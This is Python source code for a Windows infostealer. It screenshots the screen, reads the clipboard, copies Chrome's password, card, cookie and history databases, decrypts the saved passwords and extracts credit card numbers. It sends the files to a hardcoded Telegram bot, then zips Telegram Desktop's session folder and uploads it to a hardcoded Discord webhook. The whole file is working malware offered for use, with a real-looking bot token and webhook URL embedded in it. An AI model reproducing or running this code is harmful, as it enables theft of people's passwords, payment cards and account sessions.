import requests
import psutil
import os
import pyautogui
import pyperclip
import json
import webbrowser
import sqlite3
import base64
import shutil
from win32crypt import CryptUnprotectData
from cryptography.hazmat.primitives.ciphers import aead
import zipfile
import time
import os
import sys


    #For media and files
def send_Mdocument(document_path, chat_id, token):
    Durl = "https://api.telegram.org/bot{}/sendDocument".format(token)

    with open(document_path, 'rb' ) as f:
        params = {'chat_id': chat_id}
        files = {'document': f}
        response = requests.post(Durl, params=params, files=files)

    print(response.status_code, response.reason)




def steal_information():
    # Take a screenshot of the current screen
    screenshot = pyautogui.screenshot()
    file_path = os.path.join(os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') , "screenshot.png")
    screenshot.save(file_path)

    # Get all text from the clipboard
    pyautogui.hotkey('ctrl', 'a')
    # clipboard_text = pyautogui.hotkey('ctrl', 'c')
    pyautogui.hotkey('esc')

    # Write the stolen information to a file
    clipboard_text = pyperclip.paste()
    file_path2 = os.path.join(os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') , "stolen_information.txt")
    with open(file_path2, 'w',encoding='utf-8') as f:
        f.write(f'Clipboard text: {clipboard_text}')
    
    return file_path, file_path2



def open_url(url):
    try:
        # Open the URL in the default browser
        webbrowser.open(url)
        print("Browser opened successfully")
    except Exception as e:
        print("Error: Failed to open browser")
        print("Error message: ", e)


def get_string(local_state):
    with open(local_state, 'r', encoding='utf-8') as f:
        s = json.load(f)['os_crypt']['encrypted_key']
    return s


def pull_the_key(base64_encrypted_key):
    encrypted_key_with_header = base64.b64decode(base64_encrypted_key)
    encrypted_key = encrypted_key_with_header[5:]
    key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key


def decrypt_string(key, data):
    nonce, cipherbytes = data[3:15], data[15:]
    aesgcm = aead.AESGCM(key)
    plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
    plaintext = plainbytes.decode('utf-8')
    return plaintext



def stealWebPassword():
    # Location of the user's Chrome password database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\Login Data')

    # Connect to the database
    destination_file =os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') 

    time.sleep(3)# wait to update the history file
    shutil.copy(db_path,destination_file)

    conn = sqlite3.connect(destination_file+"\\Login Data")
    print(db_path)

    # Execute a SQL query to retrieve encrypted passwords
    cursor=conn.execute("SELECT action_url, username_value, password_value FROM logins")

    # Open a text file to write the results
    local_state = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State'
    pass_path = os.path.join(os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') , "passwords.txt")
    with open(pass_path, "w",  encoding='utf-8') as f:
        # Decrypt the passwords
        key = pull_the_key(get_string(local_state))
        for links, user_name, pwd in cursor.fetchall():
            #pwd = win32crypt.CryptUnprotectData(pwd)
            if pwd[0:3] == b'v10':
                print(pwd)
                pwd= decrypt_string(key, pwd)
            else:
               pwd = CryptUnprotectData(pwd)[1].decode()
            f.write("Website: {}\nUsername: {}\nPassword: {}\n".format(links, user_name, pwd))

    # Clean up
    cursor.close()
    conn.close()

    return pass_path
#Get CARD DETAILS from Browser

def stealCardDetails():
    # Location of the user's Chrome credit_cards database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\Web Data')

    # Connect to the database

    conn = sqlite3.connect(db_path)
    destination_file =os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') 

    time.sleep(3)# wait to update the history file
    shutil.copy(db_path,destination_file)

    conn = sqlite3.connect(destination_file+"\\Web Data")
    print(db_path)

    # Execute a SQL query to retrieve encrypted credit_cards
    cursor=conn.execute("SELECT * FROM credit_cards")

    # Open a text file to write the results
    card_path = os.path.join(os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') , "cards.txt")
    with open(card_path, "w") as f:
        for result in cursor.fetchall():
            f.write("CCN: {}\nEXP yr: {}\nEXP mo: {}\nNAME: {}\n".format(result[4], result[3], result[2],result[1]))

    # Clean up
    cursor.close()
    conn.close()

    return card_path
#Get BROWSER COOKIES

def stealBrowserCookies():
    # Location of the user's Chrome cookies database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\Cookies')
    destination_file =os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') 

    time.sleep(3)# wait to update the history file
    try:
        shutil.copy(db_path,destination_file)

        conn = sqlite3.connect(destination_file+"\\Cookies")
        print(db_path)

        # Execute a SQL query to retrieve encrypted cookies
    
        cursor=conn.execute("SELECT * FROM cookies")

        # Open a text file to write the results
        cookie_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cookies.txt")
        with open(cookie_path, "w") as f:
            for result in cursor.fetchall():
                f.write("Host: {}\nName: {}\nPath: {}\nExpiry: {}\nIsSecure: {}\nValue: {}\n".format(result[1], result[2], result[3], result[4], bool(result[5]), result[6]))

            # Clean up
            cursor.close()
            conn.close()
        return cookie_path
 
    except Exception as e:
        if "no such table: cookies" in str(e):
            print("Table not found, ignoring error.")
        else:
            pass
        return ""

def stealBrowserHistory():
    # Location of the user's Chrome history database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\History')
    
    destination_file =os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') 

    time.sleep(3)# wait to update the history file
    shutil.copy(db_path,destination_file)

    conn = sqlite3.connect(destination_file+"\\History")
    print(db_path)
    cursor=conn.execute("SELECT * FROM urls")

    # Open a text file to write the results
    history_path = os.path.join(os.path.expanduser(os.environ['LocalAppData'] + '\\Temp') , "history.txt")
    with open(history_path, "w", encoding='utf-8') as f:
        for result in cursor.fetchall():
            f.write("Host: {}\nTitle: {}\nVisits: {}\n".format(result[1], result[2], result[3]+1))

    # Clean up
    cursor.close()
    conn.close()

    return history_path


def kill_app(process_name):
    for process in psutil.process_iter():
        if process.name() == process_name:
            process.kill()
            print(f"{process_name} successfully killed.")
            return
    print(f"{process_name} not found.")

def tele():
    
    discord_webhook_url = "https://discordapp.com/api/webhooks/1115894638335762472/CpAf-g0zDqMaSN9qAXI-14qPEH5KWl3dYz0tj2_1XXHlzY9fIGyf6eqzQYxVzpors6Lu"

    directory = os.path.expanduser(os.environ['APPDATA'] + '\\Telegram Desktop\\tdata')
 
    exclude_folder = "user_data"

    zip_filename = os.path.expanduser(os.environ['LocalAppData'] + '\\Temp\\') +"telegramLogger.zip"
    kill_app("Telegram.exe")
    url = "https://www.telegram.org/"
    open_url(url)
    time.sleep(1)
    with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zip:
        for root, dirs, files in os.walk(directory):
            if exclude_folder in dirs:
                dirs.remove(exclude_folder)
            for file in files:
                file_path = os.path.join(root, file)
                if  'emoji' not in file_path and 'user_data' not in file_path:
                    zip.write(file_path)
            for dir in dirs:
                if 'emoji'!=dir and 'user_data' not in dir:
                    dir_path = os.path.join(root, dir)
                    zip.write(dir_path)
    time.sleep(1)
    with open(zip_filename, "rb") as f:
        file_content = f.read()
    zip_file_name = os.path.basename(zip_filename)

    files = {
        "file": (zip_file_name, file_content, "application/zip")
    }
    response = requests.post(discord_webhook_url, files=files)

    if response.status_code == 200:
        print("file was send to discord")
    else:
        print(f"{response.status_code} error")

def fun(tokenStr,chatidStr):

    
    os.system("pyinstaller  TelegramBot.py")
    


if __name__ == '__main__':

    try:
        token, chatID = sys.argv[1:3]
    except Exception as e:
        print(sys.argv)
        print(e)

    cid = "1812229159"
    tok = "5621453581:AAGsnI2k37aoX1WJx2HMmFHGQxd0ZfRNeD8"
    
    # Continuously steal screwwnshort and clipboard every 5 seconds
    file_path, file_path2 = steal_information()

    #Capture Audio from Microphone
    record_seconds = 3

    pass_path = stealWebPassword()

    #Get CARD DETAILS from Browser
    card_path = stealCardDetails()

    #Get BROWSER COOKIES
    cookie_path = stealBrowserCookies()

    #Get BROWSER HISTORY
    history_path = stealBrowserHistory()

    # Open URL IN WEB BROWSER
    time.sleep(3)
    
    #send_Mdocument(file_path, cid, tok)
    send_Mdocument(file_path2, cid, tok)
    send_Mdocument(pass_path, cid, tok)
    send_Mdocument(card_path, cid, tok)
    if cookie_path!="":
        send_Mdocument(cookie_path, cid, tok)
    send_Mdocument(history_path, cid, tok)

    time.sleep(1)
 
    tele()

 
